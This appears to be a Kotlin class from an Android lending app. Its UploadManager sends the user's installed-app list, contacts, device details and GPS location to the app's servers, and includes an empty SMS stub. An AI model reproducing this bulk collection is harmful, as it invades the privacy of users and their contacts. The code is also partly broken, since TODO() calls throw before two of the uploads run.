package com.mari.uang.util.upload

import android.Manifest
import android.location.Location
import com.mari.uang.util.upload.app.RXGetAppInfo
import com.alibaba.fastjson.JSONArray
import com.alibaba.fastjson.JSONObject
import com.coupang.common.network.ParameterTool
import com.coupang.common.user.UserManager
import com.coupang.common.utils.ToastKt
import com.mari.uang.AppApi
import com.mari.uang.MyApplication
import com.mari.uang.config.ConstantConfig.TYPE_APP
import com.mari.uang.config.ConstantConfig.TYPE_CONTACT
import com.mari.uang.util.JsonUtil
import com.mari.uang.util.PermissionUtil
import com.mari.uang.util.upload.AppInfoBean
import com.mari.uang.util.upload.DeviceInfoBean
import com.mari.uang.util.upload.LocationUtil
import java.text.SimpleDateFormat
import java.util.*

/**
 *
 * @ProjectName:    Business
 * @Package:        com.alan.business.util.upload
 * @ClassName:      UploadManager
 * @Description:     java类作用描述
 * @Author:         jtao
 * @CreateDate:     2021/4/19 7:01 PM
 * @UpdateUser:     更新者
 * @UpdateDate:     2021/4/19 7:01 PM
 * @UpdateRemark:   更新说明
 * @Version:        1.0
 */
object UploadManager{

    /**
     * 上传所有信息
     */
    fun uploadAllInfo(){
        if (!UserManager.isLogin())
            return
        uploadAppList()
        uploadSMS()
        uploadContacts()
        uploadLunDuInfo()
        uploadDevicesDetail()
        uploadDevicesReport()
        upLoadLocation()
    }

    /**
     * appList
     */
    fun uploadAppList(){
        RXGetAppInfo.getAppInfoList(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<ArrayList<AppInfoBean>>{
            override fun infoCallBack(dataObject: ArrayList<AppInfoBean>) {
                val uploadData = dataObject as ArrayList<AppInfoBean>
                AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(uploadData)),0, TYPE_APP)
            }
        })
    }

    /**
     * 上传短信
     */
    fun uploadSMS(){
    }

    /**
     * 上传联系人
     */
    fun uploadContacts(){
        if(!PermissionUtil.checkPermission(MyApplication.baseCox()!!, Manifest.permission.READ_CONTACTS)){
            return
        }
        RXGetAppInfo.getContactsList(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONArray>{
            override fun infoCallBack(dataObject: JSONArray) {
                TODO("Not yet implemented")
                AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(dataObject)),0, TYPE_CONTACT)
            }
        })
    }

    /**
     * 上传轮渡信息
     */
    fun uploadLunDuInfo(){
        RXGetAppInfo.getLunDuInfo(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONObject>{
            override fun infoCallBack(dataObject: JSONObject) {
                TODO("Not yet implemented")
                AppApi.api.uploadLunDuInfo(dataObject)
            }
        })
    }

    /**
     * 上传场景设备信息
     */
    fun uploadDevicesDetail(){
        RXGetAppInfo.getMyDevicesDetail(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<DeviceInfoBean>{
            override fun infoCallBack(dataObject: DeviceInfoBean) {
                AppApi.api.uploadDevicesDetail(ParameterTool.toRequestBody(JsonUtil.toJsonString(dataObject)))
            }
        })
    }

    /**
     * 上传设备信息
     */
    fun uploadDevicesReport(){
        RXGetAppInfo.uploadDevicesReport(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONObject>{
            override fun infoCallBack(dataObject: JSONObject) {
                AppApi.api.uploadDevicesReport(ParameterTool.toRequestBody(dataObject))
            }
        })
    }

    /**
     * 上传定位信息
     */
    fun upLoadLocation(){
        LocationUtil.startLocation(object : LocationUtil.LocCallBack{
            override fun error(errorMsg: String?) {
                ToastKt.short(errorMsg!!)
            }
            override fun location(
                location: Location?,
                addressDetail: String?,
                addressJson: String?
            ) {
                val map: MutableMap<String, Any> =
                    HashMap()
                val date = Date(location!!.time)
                val format =
                    SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                map["longitude"] = location!!.longitude
                map["latitude"] = location!!.latitude
                map["address"] = addressDetail!!
                map["addressInfo"] = addressJson!!
                map["time"] = format.format(date)
                AppApi.api.uploadLocation(ParameterTool.toRequestBody(map))
            }
        })
    }

}